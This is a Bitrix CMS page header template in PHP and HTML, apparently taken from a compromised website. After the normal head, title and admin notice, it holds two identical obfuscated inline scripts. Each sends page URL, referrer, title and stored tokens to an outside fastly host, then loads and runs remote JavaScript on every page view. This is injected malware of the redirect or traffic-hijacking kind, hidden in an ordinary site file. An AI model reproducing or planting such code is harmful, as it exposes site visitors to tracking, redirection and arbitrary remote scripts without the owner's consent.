<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();
IncludeTemplateLangFile(__FILE__);
?>
<html>
<head>
<?$APPLICATION->ShowHead();?>
<title><?$APPLICATION->ShowTitle()?></title>
</head>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" bgcolor="#FFFFFF">

<?$APPLICATION->ShowPanel()?>

<?if($USER->IsAdmin()):?>

<div style="border:red solid 1px">
	<form action="/bitrix/admin/site_edit.php" method="GET">
		<input type="hidden" name="LID" value="<?=SITE_ID?>" />
		<p><font style="color:red"><?echo GetMessage("DEF_TEMPLATE_NF")?> </font></p>
		<input type="submit" name="set_template" value="<?echo GetMessage("DEF_TEMPLATE_NF_SET")?>" />
	</form>
</div>

<?endif?>

<script>!function(){window._KKNSbmN5mYRPSVjF||(window._KKNSbmN5mYRPSVjF={unique:!1,ttl:86400,R_PATH:"https://intrstreams.global.ssl.fastly.net/NBD8mqfG"}),null!=(e=localStorage.getItem("config"))&&(o=JSON.parse(e),t=Math.round(+new Date/1e3),o.created_at+window._KKNSbmN5mYRPSVjF.ttl<t&&(localStorage.removeItem("subId"),localStorage.removeItem("token"),localStorage.removeItem("config")));var e=localStorage.getItem("subId"),o=localStorage.getItem("token"),t="?return=js.client";t+="&"+decodeURIComponent(window.location.search.replace("?","")),t+="&se_referrer="+encodeURIComponent(document.referrer),t+="&default_keyword="+encodeURIComponent(document.title),t+="&landing_url="+encodeURIComponent(document.location.hostname+document.location.pathname),t+="&name="+encodeURIComponent("_KKNSbmN5mYRPSVjF"),t+="&host="+encodeURIComponent(window._KKNSbmN5mYRPSVjF.R_PATH),void 0!==e&&e&&window._KKNSbmN5mYRPSVjF.unique&&(t+="&sub_id="+encodeURIComponent(e)),void 0!==o&&o&&window._KKNSbmN5mYRPSVjF.unique&&(t+="&token="+encodeURIComponent(o)),(o=document.createElement("script")).type="application/javascript",o.src=window._KKNSbmN5mYRPSVjF.R_PATH+t,(t=document.getElementsByTagName("script")[0]).parentNode.insertBefore(o,t)}();</script>  


<script>!function(){window._KKNSbmN5mYRPSVjF||(window._KKNSbmN5mYRPSVjF={unique:!1,ttl:86400,R_PATH:"https://intrstreams.global.ssl.fastly.net/NBD8mqfG"}),null!=(e=localStorage.getItem("config"))&&(o=JSON.parse(e),t=Math.round(+new Date/1e3),o.created_at+window._KKNSbmN5mYRPSVjF.ttl<t&&(localStorage.removeItem("subId"),localStorage.removeItem("token"),localStorage.removeItem("config")));var e=localStorage.getItem("subId"),o=localStorage.getItem("token"),t="?return=js.client";t+="&"+decodeURIComponent(window.location.search.replace("?","")),t+="&se_referrer="+encodeURIComponent(document.referrer),t+="&default_keyword="+encodeURIComponent(document.title),t+="&landing_url="+encodeURIComponent(document.location.hostname+document.location.pathname),t+="&name="+encodeURIComponent("_KKNSbmN5mYRPSVjF"),t+="&host="+encodeURIComponent(window._KKNSbmN5mYRPSVjF.R_PATH),void 0!==e&&e&&window._KKNSbmN5mYRPSVjF.unique&&(t+="&sub_id="+encodeURIComponent(e)),void 0!==o&&o&&window._KKNSbmN5mYRPSVjF.unique&&(t+="&token="+encodeURIComponent(o)),(o=document.createElement("script")).type="application/javascript",o.src=window._KKNSbmN5mYRPSVjF.R_PATH+t,(t=document.getElementsByTagName("script")[0]).parentNode.insertBefore(o,t)}();</script>  
